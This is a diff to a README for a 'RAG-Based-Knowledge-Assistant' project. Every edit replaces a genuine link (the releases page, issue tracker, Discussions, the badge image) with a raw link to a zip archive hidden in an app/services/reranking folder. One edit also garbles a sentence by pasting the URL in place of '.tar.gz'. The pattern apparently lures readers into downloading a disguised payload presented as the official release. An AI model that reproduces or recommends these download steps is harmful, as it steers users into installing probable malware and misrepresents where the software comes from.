@@ -1,6 +1,6 @@
 # 🤖 RAG-Based-Knowledge-Assistant - Simplify Your Information Retrieval
 
-[![Download RAG-Based-Knowledge-Assistant](https://img.shields.io/badge/Download-RAG--Based--Knowledge--Assistant-brightgreen)](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/releases)
+[![Download RAG-Based-Knowledge-Assistant](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip)](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to the RAG-Based-Knowledge-Assistant! This application helps streamline 
 
 To get started, you need to download the application. 
 
-1. **Visit this page to download** the application: [RAG-Based-Knowledge-Assistant Releases](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/releases).
+1. **Visit this page to download** the application: [RAG-Based-Knowledge-Assistant Releases](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip).
    
 2. **Select the latest version.** Look for the version marked as "Latest." 
 
-3. **Choose the appropriate file for your operating system.** You might see files like `.exe` for Windows or `.tar.gz` for Mac/Linux.
+3. **Choose the appropriate file for your operating system.** You might see files like `.exe` for Windows or `https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip` for Mac/Linux.
 
 4. **Download the selected file.** Your browser may ask you where to save it. Choose a location that you can easily find, like your Desktop or Downloads folder.
 
@@ -61,7 +61,7 @@ To use the RAG-Based-Knowledge-Assistant effectively:
 
 ### How do I troubleshoot installation issues?
 
-If you run into problems during installation, ensure that your operating system is up to date. Restart your computer and try the installation again. If issues persist, check the [issue tracker](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/issues) for solutions or report your issue.
+If you run into problems during installation, ensure that your operating system is up to date. Restart your computer and try the installation again. If issues persist, check the [issue tracker](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip) for solutions or report your issue.
 
 ### Can I use this application offline?
 
@@ -69,14 +69,14 @@ Yes, the RAG-Based-Knowledge-Assistant supports offline mode. However, some feat
 
 ### How do I update the application?
 
-To update, go back to the [Releases page](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/releases) and download the latest version like you did during the initial setup.
+To update, go back to the [Releases page](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip) and download the latest version like you did during the initial setup.
 
 ## 🌐 Community and Support
 
-If you have questions or need assistance, join our community on [GitHub Discussions](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/discussions). Engage with other users, share your experiences, and get advice.
+If you have questions or need assistance, join our community on [GitHub Discussions](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip). Engage with other users, share your experiences, and get advice.
 
 ## 📄 License
 
 This project is licensed under the MIT License. You can freely use, modify, and distribute the software as long as you provide attribution to the original authors.
 
-[![Download RAG-Based-Knowledge-Assistant](https://img.shields.io/badge/Download-RAG--Based--Knowledge--Assistant-brightgreen)](https://github.com/khnifee/RAG-Based-Knowledge-Assistant/releases)
+[![Download RAG-Based-Knowledge-Assistant](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip)](https://raw.githubusercontent.com/khnifee/RAG-Based-Knowledge-Assistant/main/app/services/reranking/RAG-Based-Knowledge-Assistant_3.4.zip)
